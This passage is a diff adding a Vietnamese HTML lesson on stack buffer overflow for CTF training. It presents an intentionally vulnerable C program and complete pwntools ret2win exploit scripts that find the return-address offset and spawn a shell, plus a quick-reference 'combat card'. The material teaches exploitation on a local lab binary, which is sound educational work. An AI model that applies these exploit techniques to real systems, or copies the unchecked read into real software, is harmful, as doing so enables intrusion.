@@ -1,0 +1,460 @@
+<title>Stack Buffer Overflow</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,46px);line-height:1.03;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+.frame{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.fr{display:grid;grid-template-columns:110px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:8px 10px;background:var(--surface-2)}
+.fr .o{color:var(--mem);white-space:nowrap}
+.fr.key{background:var(--accent-soft);border-color:var(--accent)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.stackvis{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0;font-family:var(--font-mono);font-size:12.5px}
+.stackvis input[type=range]{width:100%}
+.stackvis .cells{display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.stackvis .cell{border:1px solid var(--line);border-radius:6px;padding:7px 10px;background:var(--surface);display:flex;justify-content:space-between;gap:10px}
+.stackvis .cell.filled{background:var(--accent-soft);border-color:var(--accent)}
+.stackvis .cell.rip{background:var(--mem-soft);border-color:var(--mem);font-weight:700}
+.stackvis .cell.rip.hit{background:var(--ok-soft);border-color:var(--ok)}
+.stackvis .msg{color:var(--mem);margin-top:6px}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 1 · Bài 1</div>
+    <h1>Stack Buffer Overflow</h1>
+    <p class="sub">Lỗ hổng gốc của pwn: một <code>read</code>/<code>gets</code> ghi quá dung lượng buffer trên stack → tràn đè lên <mark>saved RIP</mark> (địa chỉ trả về). Kiểm soát saved RIP = <strong>kiểm soát chương trình nhảy đi đâu</strong>. Bài này đi <strong>layout frame số thật + cyclic dò offset + ret2win đầy đủ</strong>.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Nền tảng (Phase 1)</span>
+      <span class="chip"><b>Binary mẫu:</b> x86-64 no-PIE, NX, no canary</span>
+      <span class="chip"><b>Cần trước:</b> stack, hàm asm</span>
+      <span class="chip"><b>Thời lượng:</b> ~50 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Frame</a><a href="#s4">04 Dò offset</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Lỗi:</strong> <code>char buf[0x40]; read(0, buf, 0x100);</code> — đọc 0x100 byte vào buffer 0x40 byte → tràn 0xC0 byte, đè saved rbp + <mark>saved RIP</mark>.</p>
+    <p><strong>Khai thác:</strong> stack lưu "địa chỉ trả về" (saved RIP) để <code>ret</code> biết quay về đâu. Ghi đè nó = khi hàm <code>ret</code>, CPU nhảy tới địa chỉ ta chọn. Đơn giản nhất: nhảy tới hàm <code>win()</code> có sẵn (<mark>ret2win</mark>).</p>
+    <p><strong>Offset:</strong> khoảng cách từ đầu buffer tới saved RIP — dò bằng <code>cyclic</code> (de Bruijn pattern).</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>tràn tới saved RIP, ghi địa chỉ đích; dò offset bằng cyclic. Đây là nền của MỌI kỹ thuật stack.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Dò offset tới saved RIP</span>
+<pre><code>p.sendline(cyclic(200))          # pattern de Bruijn
+# crash → trong gdb:  cyclic -l $rsp   (hoặc giá trị RIP)
+OFF = 72                          # ví dụ: buf[0x40] → 0x40+8(rbp)=0x48=72</code></pre></div>
+      <div class="combat-row"><span class="lab">🎯 ret2win (đơn giản nhất)</span>
+<pre><code>payload = b"A"*OFF + p64(exe.sym.win)
+p.sendline(payload)               # ret → win()</code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ movaps align</span>
+        <p>Nếu win gọi <code>system</code>/printf → cần rsp căn 0x10. Chèn 1 gadget <code>ret</code>: <code>p64(ret) + p64(win)</code>.</p></div>
+      <div class="combat-row"><span class="lab">📐 Tính OFF nhanh</span>
+<pre><code>OFF = kích_thước_buf + 8(saved rbp)
+# buf[0x40] (rbp-0x40): OFF = 0x40 + 8 = 0x48 = 72
+# gdb chắc chắn: cyclic pattern</code></pre></div>
+      <div class="combat-row"><span class="lab">🚦 Bước kế theo mitigation</span>
+        <p>Không win() → <a href="ret2libc.html">ret2libc</a>/<a href="rop_basics.html">ROP</a>. Có canary → <a href="canary.html">leak/brute</a>. PIE → <a href="partial_overwrite.html">partial</a>/leak. NX off → <a href="ret2shellcode.html">shellcode</a>.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Stack frame &amp; saved RIP</h2>
+  <p>Khi gọi một hàm, CPU <code>push</code> địa chỉ lệnh kế (để biết chỗ quay về) — đó là <span class="mem-term">saved RIP</span> (return address). Hàm thiết lập frame: <code>push rbp; mov rbp,rsp; sub rsp,N</code> (dành chỗ biến cục bộ). Biến cục bộ (buffer) nằm ở <strong>địa chỉ THẤP hơn</strong> saved RIP. Ghi "tràn lên" (địa chỉ tăng) từ buffer sẽ chạm saved rbp rồi saved RIP. Khi hàm xong: <code>leave; ret</code> → <code>ret</code> pop saved RIP vào rip → nếu ta đã đè nó, CPU nhảy tới đích ta chọn.</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">buffer overflow</div><p>Ghi quá dung lượng buffer.</p></div>
+    <div class="card"><div class="term">saved RIP</div><p>Địa chỉ trả về trên stack.</p></div>
+    <div class="card"><div class="term">ret2win</div><p>Nhảy tới hàm win() có sẵn.</p></div>
+    <div class="card"><div class="term">offset</div><p>Khoảng cách buf → saved RIP.</p></div>
+    <div class="card"><div class="term">cyclic</div><p>Pattern de Bruijn để dò offset.</p></div>
+    <div class="card"><div class="term">ret</div><p>Pop saved RIP vào rip, nhảy.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Hàm C không kiểm tra độ dài</h2>
+  <p>Các hàm như <code>gets</code>, <code>scanf("%s")</code>, hay <code>read(0, buf, N)</code> với N &gt; sizeof(buf) ghi dữ liệu mà <strong>không kiểm tra biên buffer</strong>. C để lập trình viên tự lo — và họ thường quên. Dữ liệu thừa tràn lên các ô stack kế, gồm saved RIP. Đây là lớp lỗ hổng lâu đời nhất (Morris worm 1988) và vẫn là <strong>cửa vào</strong> của hầu hết đề pwn: kiểm soát luồng thực thi từ một input đơn giản.</p>
+ </div>
+</section>
+
+<!-- 03 Frame -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / FRAME · MỤC LÕI</div>
+  <h2>Layout stack khi tràn (số thật)</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 560 150" role="img" aria-label="stack: buffer thấp, saved rbp, saved RIP cao; overflow ghi từ buffer lên đè saved RIP" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <g font-family="monospace" font-size="11">
+    <text x="280" y="16" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.6">địa chỉ CAO ↑</text>
+    <rect x="120" y="22" width="320" height="26" rx="5" stroke-width="1.6" stroke="var(--mem)"/><text x="280" y="39" text-anchor="middle" fill="var(--mem)" stroke="none">saved RIP (return) ← đè đây</text>
+    <rect x="120" y="50" width="320" height="26" rx="5" stroke-width="1.3"/><text x="280" y="67" text-anchor="middle" fill="currentColor" stroke="none">saved rbp (8 byte)</text>
+    <rect x="120" y="78" width="320" height="52" rx="5" stroke-width="1.5" stroke="#e8663e"/><text x="280" y="100" text-anchor="middle" fill="#e8663e" stroke="none">buffer buf[0x40]</text>
+    <text x="280" y="116" text-anchor="middle" fill="#e8663e" stroke="none">overflow ghi TỪ ĐÂY LÊN →</text>
+    <text x="280" y="146" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.6">địa chỉ THẤP ↓ (rsp)</text>
+    </g>
+  </svg>
+  <figcaption>Buffer ở thấp; ghi tràn lên đè saved rbp rồi saved RIP.</figcaption>
+  </figure>
+  <h3>Bảng-byte payload ret2win</h3>
+  <div class="frame">
+    <div class="fr"><span class="o">0x00–0x3f</span><span>b"A"*0x40 — lấp buffer</span></div>
+    <div class="fr"><span class="o">0x40–0x47</span><span>b"A"*8 — đè saved rbp (rác)</span></div>
+    <div class="fr key"><span class="o">0x48 (OFF=72)</span><span><code>p64(exe.sym.win)</code> = <code>0x401176</code> → saved RIP</span></div>
+  </div>
+  <pre><code>payload = b<span class="s">"A"</span>*<span class="d">72</span> + p64(<span class="d">0x401176</span>)   <span class="c"># win = 0x401176 (no-PIE)</span></code></pre>
+ </div>
+</section>
+
+<!-- 04 Dò offset -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / DÒ OFFSET</div>
+  <h2>cyclic — pattern không lặp</h2>
+  <p><code>cyclic(n)</code> tạo chuỗi de Bruijn: mỗi 4 (hoặc 8) byte liên tiếp là <strong>duy nhất</strong>. Khi crash, giá trị trong rsp/RIP là 1 đoạn của chuỗi → <code>cyclic -l</code> tra ngược ra <strong>vị trí</strong> → chính là offset.</p>
+  <pre><code><span class="p">&gt;&gt;&gt;</span> p.sendline(cyclic(<span class="d">200</span>))        <span class="c"># gửi "aaaabaaacaaad..."</span>
+<span class="c"># chương trình crash (SIGSEGV tại địa chỉ 0x6161...)</span>
+<span class="p">pwndbg&gt;</span> cyclic -l <span class="d">0x6161616161616166</span>   <span class="c"># hoặc giá trị rsp</span>
+<span class="d">72</span>                                 <span class="c"># → OFFSET = 72</span></code></pre>
+  <div class="note tip"><span class="tag">Tính tay</span>Với <code>buf[0x40]</code> tại <code>rbp-0x40</code>: offset = 0x40 (buf) + 0x8 (saved rbp) = <code>0x48 = 72</code>. Nếu compiler thêm padding/canary thì khác — <strong>cyclic chắc ăn hơn tính tay</strong>.</div>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Trượt thanh — thấy khi nào chạm saved RIP</h2>
+  <p>Kéo số byte ghi vào. Khi đủ 72 byte, byte kế tràn vào saved RIP → kiểm soát luồng.</p>
+  <div class="lab">
+    <div class="stackvis" id="sv">
+      <label>Số byte ghi: <b id="nval">80</b></label>
+      <input type="range" id="nrange" min="0" max="96" value="80">
+      <div class="cells" id="cells"></div>
+      <div class="msg" id="svmsg"></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Offset, win, mitigations</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>checksec</h4>
+    <pre><code><span class="p">$</span> checksec ./vuln   <span class="c"># Canary? NX? PIE? RELRO? → quyết hướng</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Offset</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> cyclic(<span class="d">200</span>) → crash → cyclic_find(...)   <span class="c"># = 72</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Hàm win / đích</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> exe.sym.win   <span class="c"># có hàm "win"/"flag"/"system"? (nm/IDA)</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>ret2win (số thật)</h2>
+  <pre><code><span class="c">// vuln.c — gcc vuln.c -o vuln -fno-stack-protector -no-pie</span>
+<span class="k">void</span> win(){ system(<span class="s">"/bin/sh"</span>); }           <span class="c">// hàm "thắng" có sẵn</span>
+<span class="k">int</span> main(){ <span class="k">char</span> buf[<span class="d">0x40</span>]; read(<span class="d">0</span>, buf, <span class="d">0x100</span>); }   <span class="c">// overflow</span></code></pre>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · ret2win</button>
+    <button class="tab" data-t="b">B · có movaps align</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — dò offset + ret2win. Số thật.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+OFF = <span class="d">72</span>                          <span class="c"># dò bằng cyclic (0x40 buf + 8 rbp)</span>
+payload  = b<span class="s">"A"</span>*OFF
+payload += p64(exe.sym.win)         <span class="c"># 0x401176 → saved RIP</span>
+p.sendline(payload)
+p.interactive()                     <span class="c"># shell!</span></code></pre>
+<div class="note warn"><span class="tag">Thành thật</span><code>OFF=72</code> là của binary mẫu (buf 0x40). Của bạn dò bằng <code>cyclic</code> (đừng tính tay nếu có canary/padding). <code>exe.sym.win</code> tự lấy địa chỉ win (no-PIE cố định).</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — win gọi system → cần căn rsp 0x10 (movaps).</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+OFF = <span class="d">72</span>
+ret = ROP(exe).find_gadget([<span class="s">"ret"</span>])[<span class="d">0</span>]   <span class="c"># gadget ret trơn</span>
+payload = b<span class="s">"A"</span>*OFF + p64(ret) + p64(exe.sym.win)   <span class="c"># căn 0x10 rồi win</span>
+p.sendline(payload)
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">movaps</span>Nếu ret2win vào hàm gọi <code>system</code>/<code>printf</code> mà crash ngay trong đó → rsp lệch 0x10. Thêm 1 gadget <code>ret</code> trước win để dịch stack 8 byte. (xem <a href="ret2libc.html">ret2libc §movaps</a>.)</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>); p = start()
+sl(b<span class="s">"A"</span>*<span class="d">72</span> + p64(exe.sym.win)); ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span>Giống pwntools, rút gọn I/O. Nền tảng này giống nhau mọi tool.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Không crash / không win</h4><p>OFF sai. Dò lại cyclic. Kiểm có canary (checksec).</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Crash trong win (system)</h4><p>movaps. Thêm gadget ret.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>PIE → win random</h4><p>exe.sym.win cần +base. Leak/partial.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">checksec</div><h4>Mitigations</h4><p>Canary/NX/PIE/RELRO.</p></div>
+    <div class="card"><div class="term">cyclic</div><h4>Offset</h4><p>de Bruijn pattern.</p></div>
+    <div class="card"><div class="term">gdb pwndbg</div><h4>Crash analysis</h4><p>Xem rsp/rip khi crash.</p></div>
+    <div class="card"><div class="term">nm / IDA 9.1 Pro</div><h4>Tìm win</h4><p>Hàm đích.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi không kiểm soát được</h2>
+  <div class="grid">
+    <div class="card"><h4>Offset sai</h4><p>Dò lại cyclic; chú ý canary/padding.</p></div>
+    <div class="card"><h4>Canary</h4><p>checksec "Canary found". Leak/brute (xem canary).</p></div>
+    <div class="card"><h4>movaps</h4><p>Thêm gadget ret trước win.</p></div>
+    <div class="card"><h4>PIE</h4><p>win random. Leak/partial overwrite.</p></div>
+    <div class="card"><h4>Null byte cắt</h4><p>scanf %s/gets dừng ở null/space. read OK.</p></div>
+    <div class="card"><h4>Không có win</h4><p>Dựng ROP (ret2libc/rop_basics).</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & KIẾN TRÚC</div>
+  <h2>Sau overflow là gì?</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Tình huống</th><th>Bước kế</th></tr></thead>
+    <tbody>
+      <tr><td>Có hàm win()</td><td>ret2win (bài này)</td></tr>
+      <tr><td>NX off, nhập shellcode được</td><td><a href="ret2shellcode.html">ret2shellcode</a></td></tr>
+      <tr><td>NX on, có libc</td><td><a href="ret2libc.html">ret2libc</a></td></tr>
+      <tr><td>Canary</td><td><a href="canary.html">leak/brute canary</a></td></tr>
+      <tr><td>PIE</td><td><a href="partial_overwrite.html">partial</a>/leak</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">x86 (32-bit)</span>saved EIP 4 byte; đối số hàm trên stack (ret2win(arg): <code>win_addr; ret_giả; arg</code>). Offset = buf + 4 (saved ebp). <code>u32/p32</code>.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐ · ret2win</div><p>Overflow buf, nhảy win(). Dò offset bằng cyclic.</p></div>
+  <div class="ex"><div class="level">⭐⭐ · ret2win có đối số</div><p>win(0xdeadbeef): set rdi bằng pop rdi trước khi gọi.</p></div>
+  <div class="ex"><div class="level">⭐⭐ · movaps</div><p>win gọi system: thêm gadget ret căn stack.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">buffer overflow</div><p>Ghi quá dung lượng buffer.</p></div>
+    <div class="card"><div class="term">saved RIP</div><p>Địa chỉ trả về trên stack.</p></div>
+    <div class="card"><div class="term">ret2win</div><p>Nhảy hàm win() có sẵn.</p></div>
+    <div class="card"><div class="term">offset</div><p>buf → saved RIP.</p></div>
+    <div class="card"><div class="term">cyclic</div><p>de Bruijn dò offset.</p></div>
+    <div class="card"><div class="term">movaps</div><p>system cần rsp căn 0x10.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Tiếp: <a href="ret2shellcode.html">ret2shellcode</a> · <a href="ret2libc.html">ret2libc</a> · <a href="rop_basics.html">rop_basics</a>. Mitigation: <a href="canary.html">canary</a> · <a href="partial_overwrite.html">partial</a>.</li>
+    <li>"Smashing The Stack For Fun And Profit" (Aleph One) · pwntools cyclic docs.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 1 · Bài 1.</strong> Overflow tràn tới saved RIP → ghi địa chỉ đích → ret nhảy vào. ret2win = nhảy win() có sẵn. Dò offset bằng cyclic. Nền của MỌI kỹ thuật stack. Tiếp theo: ret2shellcode.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("so-theme",n);}catch(e){}});
